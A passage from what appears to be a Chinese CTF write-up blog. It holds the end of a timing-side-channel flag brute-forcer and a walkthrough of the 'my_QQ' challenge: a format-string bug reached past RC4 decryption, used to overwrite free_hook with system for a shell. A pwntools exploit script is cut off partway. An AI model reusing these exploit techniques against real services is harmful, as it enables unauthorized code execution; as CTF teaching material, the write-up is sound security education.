</span></span><span class="line"><span class="cl">	<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x2a</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="c1">#pause()	</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">possible_list</span> <span class="o">=</span> <span class="s2">&#34;-0123456789abcdefghijklmnopqrstuvwxyz</span><span class="si">{}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">last</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 逐字符爆破</span>
</span></span><span class="line"><span class="cl">    <span class="n">update</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127) </span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.108.206.43&#34;</span><span class="p">,</span><span class="mi">24921</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#p = process(&#34;./chall&#34;)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 远程比较容易断，可以多次连接</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        for i in range(10):
</span></span></span><span class="line"><span class="cl"><span class="s1">            try:
</span></span></span><span class="line"><span class="cl"><span class="s1">                sh = remote(&#34;1.1.1.1&#34;, &#34;11111&#34;)
</span></span></span><span class="line"><span class="cl"><span class="s1">                break
</span></span></span><span class="line"><span class="cl"><span class="s1">            except:
</span></span></span><span class="line"><span class="cl"><span class="s1">                sleep(3)
</span></span></span><span class="line"><span class="cl"><span class="s1">                continue
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pwn</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">end</span><span class="o">-</span><span class="n">start</span> <span class="o">&gt;</span> <span class="mf">1.5</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">last</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">update</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[ flag + 1 !!! ] &#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">assert</span><span class="p">(</span><span class="n">update</span> <span class="o">==</span> <span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">last</span> <span class="o">==</span> <span class="s1">&#39;}&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag: &#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="my_qq"><span>my_QQ</span>
  <a href="#my_qq" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>参考链接：https://ycznkvrmzo.feishu.cn/docx/G17xduF91omE5nxgkgfc1W93nqb</p>
<p>前言：比赛时进入到了存在格式化字符串漏洞的函数，但是一直卡在rc4 加解密那里</p>
<p>首先介绍一下程序怎么启动</p>
<p>在本地目录下创下如下目录&rdquo;./pem/server/&rdquo;</p>
<p>然后使用openssl生成公私钥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">openssl genrsa -out privatekey.pem <span class="m">1024</span>
</span></span><span class="line"><span class="cl">openssl rsa -in privatekey.pem -out public.pem -outform PEM -pubout</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111762.png' alt="image-20240112200247729"></p>
<p>接着程序开启一个10000端口，并向该端口接收和发送数据</p>
<p>进入start_routine 函数，主要有两个功能，register 和login，接收4字节，如果为yes， 则进入login 函数，如果不是，则进入register 函数。接下来先看register 功能</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111763.png' alt="image-20240112202203477"></p>
<p>首先接收0x400字节的buf，buf 输入的内容后面进行介绍，接下来进行公钥验证，然后进入register 函数中</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111764.png' alt="image-20240112211306960"></p>
<p>verify_key 函数中，会向1000端口的socket 链接发送public key，在1000端口的socket 链接中，我们接收到该pulbic key之后再发送给该程序即可</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111765.png' alt="image-20240112212123823"></p>
<p>接下来进入register func 中，首先需要连接数据库，然后从a3（也就是上面说的0x400字节的buf ）前0x10 字节复制给user_name ，后面的0x30 字节复制给password。然后通过sql 语句查询用户是否存在，如果存在，打印该用户的的注册时间，如果不存在，则在表中创建该用户字段。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111766.png' alt="image-20240112214416104"></p>
<p>注意需要连接mysql 数据库，因此我们需要安装mysql，并创建<code>my_qq</code>  数据库， 这俩我选择下载phpstudy 集成环境，user 表的具体字段由ida 的反汇编代码得知</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111767.png' alt="image-20240112203601236"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111768.png' alt="image-20240112203937155"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111769.png' alt="image-20240112211103792"></p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111770.png' alt="image-20240112210912812"></p>
<p>接下来分析login 功能</p>
<p>首先接收0x400 的buf ，和register 中一样， 前0x10 字节是usrname，后0x30 字节是password，查询表中是否存在 user name 和password 相同的用户，接着是交换公钥。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111771.png' alt="image-20240112220001934"></p>
<p>接着传输rc4 密钥，然后进入消息传递函数中，会对接收到的消息进行rc4 解密，然后打印</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111772.png' alt="image-20240112221410349"></p>
<p>漏洞点即为格式化字符串漏洞</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111773.png' alt="image-20240112221435604"></p>
<p>利用过程类似于栈上的格式化字符串漏洞，注意到dest，也就是rc4加密后的msg 的十六进制数据，其通过strlen进行计算长度的，如果我们通过在需要rc4加密后的数据上通过<code>&quot;\x00&quot;</code>填充，那么后面的数据就会截断，不会对其解密。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111774.png' alt="image-20240113020048534"></p>
<p>因此，我们在格式化字符串漏洞利用时只用对前面的<code>% size c% index hhn</code> 这些数据加密，<code>&quot;\x00&quot;</code>填充后跟上我们要篡改的地址即可。</p>
<blockquote>
<p>起初我是对payload都进行了加密，发现在314偏移处存在解密后的数据，于是我对此进行任意地址写，但是发现这里程序会直接调用free，触发free_hook，这里我们仅仅只修改了一字节，会导致程序crash。</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111775.png' alt="image-20240113022026079"></p>
<p>但是为何会调用free的原因未知（下面exp中的方法就不会调用free)，我们可以考虑换一种方法，因为程序最后会调用exit(-1)，那么将exit_hook 修改为one_gadget 也是可以get shell 的。</p></blockquote>
<p>本题的利用思路就是利用格式化字符串漏洞任意写free_hook 为system，然后发送加密后的<code>&quot;/bin/sh\x00&quot;</code>字符串即可getshell。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ARC4</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">local</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">debug</span><span class="o">=</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p_server</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./serverpthread_rsa_hash&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p_server</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.108.206.43&#34;</span><span class="p">,</span><span class="mi">43481</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc-2.31.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.108.206.43&#34;</span><span class="p">,</span><span class="mi">22820</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#34;47.108.206.43&#34;,44947)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">func</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">passwd</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">payload</span><span class="o">=</span><span class="n">name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">passwd</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">      <span class="n">key</span> <span class="o">=</span> <span class="n">key1</span>
</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="n">res</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">res</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">int_to_bytes</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># 将整数转换为字节</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_data</span> <span class="o">=</span> <span class="n">num</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">num</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">byte_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#register</span>
</span></span><span class="line"><span class="cl"><span class="c1"># s(&#34;no\x00\x00&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># s(func(b&#34;root&#34;,b&#34;root&#34;))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># root_public_key=ru(&#34;-----END PUBLIC KEY-----\n&#34;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># print(root_public_key)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># s(root_public_key)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#local public key</span>
</span></span><span class="line"><span class="cl">    <span class="n">root_public_key</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="s2">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnJJhk+sxDQWZeBXmpECm
</span></span></span><span class="line"><span class="cl"><span class="s2">HaWTpiZIh4EQfm9irhC5wQFOByWwiCrVrdi37h43rnp0PvnXEhKgGIokdoZLl1St
</span></span></span><span class="line"><span class="cl"><span class="s2">NwApRX7RitZCo2V28PaQzwJwFQoy95RvvAHNn7gJSylEuKQfAbzC5oGH8IvWNokM
</span></span></span><span class="line"><span class="cl"><span class="s2">+wkSdtMQ9EzfKZ5eEfVJxUGofecK/4UsQqgOZPtumatJf84psQXtbQQTsw94dxoz
</span></span></span><span class="line"><span class="cl"><span class="s2">55JJ8z+wsaqx4v3d21pggORPv1oR1LwIpWne1yPgOW3egGtpCO4FhoclYOIFehwh
</span></span></span><span class="line"><span class="cl"><span class="s2">dD5aFsZ8fuRAQPMiOPOKUo5EZwz/L4eocGchQXQTK1PEBU392rnAvoee71EfSl7f
</span></span></span><span class="line"><span class="cl"><span class="s2">7QIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="s2">-----END PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># remote_public_key</span>
</span></span><span class="line"><span class="cl">    <span class="n">root_public_key</span><span class="o">=</span><span class="s2">&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="s2">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApoS1VyO6VZKyho32VC4/
</span></span></span><span class="line"><span class="cl"><span class="s2">btl1kgnMczBZvApAV2IC4h67fLbnnLlhOqiyIJcy6k6weK+JAdLCmquADnKJ3ZyW
</span></span></span><span class="line"><span class="cl"><span class="s2">eChvFKJ/L39Cb5YEZoJs3kNST0cHqtYI1bZX7vCe1KBfMPuygXxkgNTcxG4Fdzwi
</span></span></span><span class="line"><span class="cl"><span class="s2">SmKmYDcdDxeZP1z708x92fvPyYvFWiyaAzyw9QTqdH+JRcIRyVOdwc1ciSqqkaH4
</span></span></span><span class="line"><span class="cl"><span class="s2">TiOvVFHKsyInBIiF7bkl8mJMPb5vSKcVWrXHPEMcAiLmTG1mA1n/RKc+Ux3fUfjt
</span></span></span><span class="line"><span class="cl"><span class="s2">0UiATggCL86vCDcMhdToU+1QMdd3y+Nay9x/vm2thp/TpCl+MyzM1sld/TWJG+10
</span></span></span><span class="line"><span class="cl"><span class="s2">CwIDAQAB
</span></span></span><span class="line"><span class="cl"><span class="s2">-----END PUBLIC KEY-----
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;yes</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">func</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;root&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">root_public_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Login succeess &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span><span class="p">(</span><span class="mh">0x3f0</span><span class="p">)</span>
